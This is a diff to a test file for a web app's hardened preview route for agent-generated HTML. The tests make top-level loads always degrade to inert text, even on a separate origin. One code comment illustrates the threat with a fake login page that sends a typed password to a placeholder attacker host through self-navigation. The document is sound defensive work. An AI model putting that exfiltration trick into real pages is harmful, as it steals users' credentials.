@@ -7,7 +7,7 @@
  *  - the preview route (`GET /preview/documents/:id`) serves a document ONLY with
  *    a valid, unexpired, doc-bound signed token. HTML (active content) gets the
  *    full hardened header set (strict CSP incl. `sandbox allow-scripts` — the
- *    opaque origin that denies top-level navigation — nosniff, no-referrer,
+ *    opaque origin: no storage, no cookies, no popups — nosniff, no-referrer,
  *    Permissions-Policy, no Set-Cookie) plus a parse-time `<meta>` CSP injected
  *    as the FIRST child of `<head>` carrying the same policy WITHOUT `sandbox`
  *    (ignored in a meta context); the inert kinds (image / pdf / text) stream
@@ -113,8 +113,8 @@ describe("GET /preview/documents/:id — hardened HTML preview", () => {
     const token = mintToken(docId, ctx.orgId, nowSec() + 300);
 
     // `Sec-Fetch-Dest: iframe` is what the SPA's `sandbox="allow-scripts"`
-    // iframe sends; in same-origin mode it is the only context served as
-    // ACTIVE html (see the degradation tests below).
+    // iframe sends; it is the ONLY context served as ACTIVE html, in every mode
+    // (see the degradation tests below).
     const res = await app.request(`/preview/documents/${docId}?t=${encodeURIComponent(token)}`, {
       headers: { "Sec-Fetch-Dest": "iframe" },
     });
@@ -351,12 +351,13 @@ describe("GET /preview/documents/:id — hardened HTML preview", () => {
     });
   });
 
-  describe("same-origin mode — agent HTML never executes on the app origin", () => {
+  describe("agent HTML is active ONLY in a nested frame — in every mode", () => {
     // `preview_url` is an ABSOLUTE url with a 300 s token, so it can be opened
-    // top-level (new tab, shared link). Without USERCONTENT_URL that origin is
-    // APP_URL, where there is no sandbox attribute: the agent's script would
-    // reach the SPA's localStorage/sessionStorage and non-HttpOnly cookies.
-    // Only a proven nested-document load is served as active HTML.
+    // top-level (new tab, shared link). A top-level agent document cannot be
+    // contained: a sandboxed navigable may always navigate ITSELF, so the page
+    // can BE a fake login form and exfiltrate what is typed into it via
+    // `location = "https://evil.example/?p=" + password`. Only a proven
+    // nested-document load is served as active HTML.
     const degraded = ["document", "empty", "object", "embed"] as const;
 
     for (const dest of degraded) {
@@ -395,18 +396,53 @@ describe("GET /preview/documents/:id — hardened HTML preview", () => {
       expect(res.headers.get("content-type")).toBe("text/plain; charset=utf-8");
     });
 
-    it("keeps serving active HTML in ANY context once USERCONTENT_URL isolates the origin", async () => {
+    it("degrades a top-level load even when USERCONTENT_URL is configured", async () => {
+      // A separate origin buys a distinct storage partition / cookie jar /
+      // process — it does NOT make a top-level render containable, because the
+      // document can still navigate itself and carry data out in the URL. So
+      // the fail-closed gate has no separate-origin escape hatch: this response
+      // is the SAME inert degradation the same-origin cases above assert.
+      const docId = await seedDoc(ctx);
+      const token = mintToken(docId, ctx.orgId, nowSec() + 300);
+      await withEnv("USERCONTENT_URL", "https://usercontent.example", async () => {
+        // Top-level navigation, and the same request with the header absent.
+        const headerSets: Record<string, string>[] = [{ "Sec-Fetch-Dest": "document" }, {}];
+        for (const headers of headerSets) {
+          const res = await app.request(
+            `/preview/documents/${docId}?t=${encodeURIComponent(token)}`,
+            { headers },
+          );
+          expect(res.status).toBe(200);
+          expect(res.headers.get("content-type")).toBe("text/plain; charset=utf-8");
+          expect(res.headers.get("content-disposition")).toBe("inline");
+          expect(res.headers.get("x-content-type-options")).toBe("nosniff");
+          expect(res.headers.get("content-security-policy")).toBe(
+            `default-src 'none'; frame-ancestors ${new URL(getEnv().APP_URL).origin}`,
+          );
+          expect(res.headers.get("vary")).toBe("Sec-Fetch-Dest");
+          // No active-HTML directive survives on the inert branch.
+          expect(res.headers.get("content-security-policy")).not.toContain("unsafe-inline");
+          expect(res.headers.get("content-security-policy")).not.toContain("sandbox");
+          // Source, not a document: no meta CSP was injected.
+          const body = await res.text();
+          expect(body).toContain("<html>");
+          expect(body).not.toContain('<meta http-equiv="Content-Security-Policy"');
+        }
+      });
+    });
+
+    it("still renders active HTML for an iframe load in USERCONTENT_URL mode", async () => {
       const docId = await seedDoc(ctx);
       const token = mintToken(docId, ctx.orgId, nowSec() + 300);
       await withEnv("USERCONTENT_URL", "https://usercontent.example", async () => {
         const res = await app.request(
           `/preview/documents/${docId}?t=${encodeURIComponent(token)}`,
-          { headers: { "Sec-Fetch-Dest": "document" } },
+          { headers: { "Sec-Fetch-Dest": "iframe" } },
         );
         expect(res.status).toBe(200);
         expect(res.headers.get("content-type")).toBe("text/html; charset=utf-8");
         expect(res.headers.get("content-security-policy")).toContain("script-src 'unsafe-inline'");
-        // Active anywhere still means active inside an opaque origin.
+        // Active still means active inside an opaque origin.
         expect(res.headers.get("content-security-policy")).toContain("sandbox allow-scripts");
       });
     });
